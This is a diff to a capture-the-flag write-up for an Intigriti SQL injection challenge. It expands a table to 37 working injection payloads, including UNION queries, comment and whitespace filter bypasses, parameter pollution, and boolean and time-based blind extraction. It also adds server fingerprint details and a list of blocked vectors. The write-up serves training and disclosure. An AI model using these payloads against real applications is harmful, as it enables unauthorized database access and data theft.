@@ -3,11 +3,14 @@
 **Intigriti — September 2026 CTF**
 A cute animal gallery hiding a one-column UNION injection.
 
+Write-up by [**Rajib Mahmud**](https://github.com/Rajib-Mahmud)
+
 | | |
 |---|---|
 | **Target** | `challenge-0926.challenges.intigriti.io` |
 | **Category** | SQL Injection |
-| **Author** | [khanhdlq](https://x.com/khanhdlq) |
+| **Challenge author** | [khanhdlq](https://x.com/khanhdlq) |
+| **Write-up by** | [Rajib Mahmud](https://github.com/Rajib-Mahmud) |
 | **Stack** | PHP 8.2 · MySQL 8.0 |
 | **Flag** | `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}` |
 
@@ -119,42 +122,90 @@ x' UNION SELECT note FROM secret_vault LIMIT 1--
 | db user | `gallery@10.18.49.50` |
 | hostname | `db-7df4c4d979-qvq6s` · k8s pod |
 | os | Linux |
-| mysql | 8.0.46 Community |
+| mysql | 8.0.46 Community (GPL) |
+| databases visible | `critter_gallery`, `information_schema`, `performance_schema` |
+| port / socket | `3306` · `/var/run/mysqld/mysqld.sock` |
+| datadir / tmpdir | `/var/lib/mysql/` · `/tmp` |
+| charset / timezone | `utf8mb4` · `SYSTEM` |
+| server uuid | `ab64aa3b-b5a5-11f1-860b-b627227199c4` |
 | secure_file_priv | `/var/lib/mysql-files/` — LOAD_FILE / OUTFILE blocked |
 
 ## Arsenal
 
-The injection point is wildly permissive — **37 techniques** confirmed live. A sample per class:
+The injection point is wildly permissive. All **37 techniques** below were tested live against the target and confirmed working — the full method list, not a sample.
 
-**Direct · single request**
+**Direct extraction · single request (20)**
 
 | # | Method | Payload |
 |---|---|---|
-| 01 | UNION | `x' UNION SELECT note FROM secret_vault LIMIT 1-- ` |
-| 04 | comment | `x'/**/UNION/**/SELECT/**/note/**/FROM/**/secret_vault-- ` |
-| 07 | JSON_OBJECT | `x' UNION SELECT JSON_OBJECT('flag',note) FROM secret_vault-- ` |
-| 08 | hex LIKE | `... WHERE note LIKE 0x494e544947524954497b2525-- ` |
-| 15 | mixed case | `x' uNiOn SeLeCt note FrOm secret_vault-- ` |
-| 21 | HPP | `?pic=Zm94&pic=<sqli>` |
+| 01 | UNION SELECT | `x' UNION SELECT note FROM secret_vault LIMIT 1-- ` |
+| 02 | UNION ALL SELECT | `x' UNION ALL SELECT note FROM secret_vault LIMIT 1-- ` |
+| 03 | UNION DISTINCT SELECT | `x' UNION DISTINCT SELECT note FROM secret_vault LIMIT 1-- ` |
+| 04 | `/**/` comment bypass | `x'/**/UNION/**/SELECT/**/note/**/FROM/**/secret_vault-- ` |
+| 05 | Tab-separated keywords | `x'\tUNION\tSELECT\tnote\tFROM\tsecret_vault-- ` |
+| 06 | Newline-separated keywords | `x'\nUNION\nSELECT\nnote\nFROM\nsecret_vault-- ` |
+| 07 | JSON_OBJECT() | `x' UNION SELECT JSON_OBJECT('flag',note) FROM secret_vault-- ` |
+| 08 | Hex-encoded string literal | `... WHERE note LIKE 0x494e544947524954497b2525-- ` |
+| 09 | Subquery in SELECT | `x' UNION SELECT (SELECT note FROM secret_vault LIMIT 1)-- ` |
+| 10 | Subquery, no spaces | `x'UNION(SELECT(note)FROM(secret_vault)LIMIT 1)-- ` |
+| 11 | SUBSTR() / MID() | `x' UNION SELECT SUBSTR(note,1,50) FROM secret_vault-- ` |
+| 12 | ELT() | `x' UNION SELECT ELT(1,note) FROM secret_vault-- ` |
+| 13 | MAKE_SET() / COALESCE() / IFNULL() | `x' UNION SELECT COALESCE(note,'null') FROM secret_vault-- ` |
+| 14 | HTTP Parameter Pollution | `?pic=<b64 fox>&pic=<b64 sqli>` — second `pic=` wins |
+| 15 | `#` comment terminator | `x' UNION SELECT note FROM secret_vault LIMIT 1#` |
+| 16 | `-- -` comment terminator | `x' UNION SELECT note FROM secret_vault LIMIT 1-- -` |
+| 17 | `/*!50000*/` versioned comment | `x' /*!50000UNION*/ /*!50000SELECT*/ note FROM secret_vault-- ` |
+| 18 | `/*! */` inline comment | `x'/*!UNION SELECT note FROM secret_vault LIMIT 1*/-- ` |
+| 19 | Mixed case | `x' uNiOn SeLeCt note FrOm secret_vault-- ` |
+| 20 | Session variable assignment | `x' UNION SELECT @v:=(SELECT note FROM secret_vault LIMIT 1)-- ` |
 
-**Boolean blind · ~14 B delta**
+**Boolean blind · page-size delta (11)**
 
-| # | Method | true | false |
+| # | Method | true (B) | false (B) |
 |---|---|---|---|
-| 22 | IF() | 4136 | 4122 |
-| 23 | CASE WHEN | 4158 | 4144 |
-| 24 | STRCMP() | 4138 | 4124 |
-| 28 | REGEXP | 4137 | 4122 |
-| 30 | EXISTS() | 4141 | 4126 |
+| 21 | IF() | 4136 | 4122 |
+| 22 | CASE WHEN | 4158 | 4144 |
+| 23 | STRCMP() | 4138 | 4124 |
+| 24 | BETWEEN | 4154 | 4140 |
+| 25 | ASCII()=value | 4124 | 4111 |
+| 26 | String comparison `>` | 4134 | 4120 |
+| 27 | REGEXP | 4137 | 4122 |
+| 28 | COUNT(*) | 4144 | 4129 |
+| 29 | EXISTS() | 4141 | 4126 |
+| 30 | XOR | 4131 | 4447 |
+| 31 | NOT IN | 4137 | 0 |
 
-**Time blind**
+**Time-based blind (3)**
 
 | # | Method | hit | miss |
 |---|---|---|---|
-| 33 | IF + SLEEP | 2.6s | 0.5s |
-| 35 | cartesian (no SLEEP) | 5.8s | 0.6s |
+| 32 | IF() + SLEEP() | 2.6s | 0.5s |
+| 33 | CASE WHEN + SLEEP() | 2.6s | 0.6s |
+| 34 | Heavy query / cartesian product (no SLEEP) | 5.8s | 0.6s |
 
-> Dead ends: error-based (errors suppressed), stacked queries (driver blocks), LOAD_FILE / OUTFILE (no FILE priv).
+**Encoding / bitwise extraction (3)**
+
+| # | Method | Result |
+|---|---|---|
+| 35 | HEX() → offline decode | `494E5449...` → decode to flag |
+| 36 | ASCII()/ORD() char-by-char | `73` → `I`, byte by byte |
+| 37 | ORD()=N boolean check | `IF(ORD(SUBSTRING(note,1,1))=73,'YES','NO')` |
+
+### Tested and blocked
+
+| Vector | Result |
+|---|---|
+| Error-based (`extractvalue`, `updatexml`, `exp()` overflow, `floor(rand())` GROUP BY, `geometrycollection()`) | PHP suppresses SQL errors — no output channel |
+| Stacked queries / `PREPARE` + `EXECUTE` | Driver blocks multi-statement execution |
+| `LOAD_FILE()` / `INTO OUTFILE` | No `FILE` privilege; `secure_file_priv` locked to `/var/lib/mysql-files/`; write succeeds but read-back fails |
+| Header injection (User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie) | Not reflected into the query — only `?pic=` is |
+| POST body / JSON body `pic=` | Endpoint reads the query string only |
+| URL-encoded space (`%20`) in place of a literal space | Breaks the payload before it reaches MySQL |
+| `DO SLEEP()` | Syntax error in this context |
+| Alternate endpoints (`/api.php`, `/admin.php`, `/flag.php`, `/.env`, …) | All `404` |
+| `mysql.user` table read | No cross-schema privilege beyond `information_schema` |
+
+The `gallery` DB user is otherwise well-scoped: no file I/O, no stacked queries, no RCE path. The exposure is entirely the missing input sanitization on `?pic=`.
 
 ## PoC
 
